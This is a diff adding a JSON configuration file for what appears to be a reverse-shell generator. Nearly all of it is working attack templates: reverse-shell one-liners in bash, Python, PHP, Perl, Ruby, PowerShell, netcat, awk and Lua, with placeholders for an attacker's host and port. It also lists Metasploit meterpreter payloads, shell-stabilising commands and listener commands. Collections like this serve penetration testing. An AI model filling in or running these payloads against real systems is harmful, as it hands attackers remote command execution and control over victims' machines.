@@ -1,0 +1,38 @@
+{
+    "reverse_shells": {
+      "bash": "bash -i >& /dev/tcp/{}/{} 0>&1",
+      "bash_udp": "bash -i >& /dev/udp/{}/{} 0>&1",
+      "python": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'",
+      "python_windows": "python -c \"import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"{}\\\",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"cmd.exe\\\"])\"",
+      "php": "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+      "perl": "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+      "ruby": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{}\",\"{}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+      "powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{}\",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close()",
+      "nc": "nc -e /bin/sh {} {}",
+      "nc_openbsd": "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {} {} > /tmp/f",
+      "nc_windows": "nc.exe {} {} -e cmd.exe",
+      "awk": "awk 'BEGIN {s = \"/inet/tcp/0/{}/{}\"; while(1) { do { getline line < s; if (line == \"exit\") exit; print | \"/bin/sh\" } while (line != \"\"); close(s) }}'",
+      "lua": "lua -e \"local host, port = '{}', {}; local socket = require('socket'); local tcp = socket.tcp(); tcp:connect(host, port); while true do local cmd = tcp:receive(); local f = assert(io.popen(cmd, 'r')); local s = f:read('*a'); tcp:send(s); f:close() end\""
+    },
+    "metasploit_payloads": {
+      "linux_meterpreter": "linux/x64/meterpreter/reverse_tcp",
+      "windows_meterpreter": "windows/meterpreter/reverse_tcp",
+      "php_meterpreter": "php/meterpreter_reverse_tcp",
+      "python_meterpreter": "python/meterpreter/reverse_tcp"
+    },
+    "tty_upgrade_methods": [
+      "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "echo os.system('/bin/bash')",
+      "script /dev/null -c bash",
+      "rlwrap nc -lvnp 4444",
+      "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sane",
+      "SHELL=/bin/bash script -q /dev/null"
+    ],
+    "listeners": {
+      "nc": "nc -lvnp {}",
+      "socat": "socat TCP-LISTEN:{},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sane",
+      "msfconsole": "msfconsole -q -x 'use multi/handler; set payload {}; set LHOST {}; set LPORT {}; run'"
+    },
+    "history_file": "~/.revshell_history.json"
+  }
+  
